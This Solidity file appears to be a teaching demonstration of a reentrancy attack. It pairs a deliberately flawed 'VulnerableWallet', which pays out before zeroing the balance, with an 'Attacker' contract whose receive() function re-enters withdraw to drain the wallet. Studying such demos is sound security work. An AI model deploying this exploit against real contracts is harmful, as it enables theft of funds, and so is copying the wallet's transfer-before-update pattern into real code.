// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableWallet {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Insufficient funds");

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }
}

contract Attacker {
    VulnerableWallet public vulnerableWallet;

    constructor(address _vulnerableWalletAddress) {
        vulnerableWallet = VulnerableWallet(_vulnerableWalletAddress);
    }

    // Fallback function used to call withdraw again
    receive() external payable {
        if (address(vulnerableWallet).balance >= 1 ether) {
            vulnerableWallet.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Minimum 1 ether required");
        vulnerableWallet.deposit{value: 1 ether}();
        vulnerableWallet.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
